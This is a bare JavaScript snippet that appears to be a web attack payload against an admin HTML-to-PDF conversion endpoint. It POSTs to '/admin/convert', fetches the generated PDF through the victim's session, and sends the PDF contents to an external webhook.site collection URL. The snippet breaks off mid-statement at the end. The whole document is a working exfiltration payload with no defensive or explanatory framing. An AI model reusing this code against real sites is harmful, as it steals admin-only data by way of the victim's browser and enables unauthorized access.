const htmlCode = "some-random-value"; // Set the random value to send
const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
xhr.onload = function() { // Set the callback function to handle the response
  if (xhr.status === 200) { // If the response status is OK
    const response = JSON.parse(xhr.responseText); // Parse the response text as JSON
    const pdfLink = response.pdfLink; // Get the PDF link from the response
    // Get the PDF data from the PDF link
    const pdfRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
    pdfRequest.open("GET", pdfLink); // Set the request method and endpoint
    pdfRequest.responseType = "text"; // Set the response type to text
    pdfRequest.onload = function() { // Set the callback function to handle the response
      if (pdfRequest.status === 200) { // If the response status is OK
        const pdfData = pdfRequest.responseText; // Get the PDF data from the response
        // Send the PDF data to the webhook
        const webhookUrl = "https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39";
        const webhookRequest = new XMLHttpRequest(); // Create a new XMLHttpRequest object
        webhookRequest.open("POST", webhookUrl); // Set the request method and endpoint
        webhookRequest.setRequestHeader("Content-Type", "application/json"); // Set the request header
        webhookRequest.onreadystatechange = function() {
          if (this.readyState === 4 && this.status === 200) { // If the response status is OK
            console.log("PDF data sent to webhook.");
          }
        };
        webhookRequest.send(JSON.stringify({ pdfData: pdfData })); // Send the request with the PDF data in JSON format
      }
    };
    pdfRequest.onerror = function() { // Set the callback function to handle errors
      console.log("Error getting PDF data.");
    };
    pdfRequest.send(); // Send the request to get the PDF data
  }
};
xhr.onerror = function()
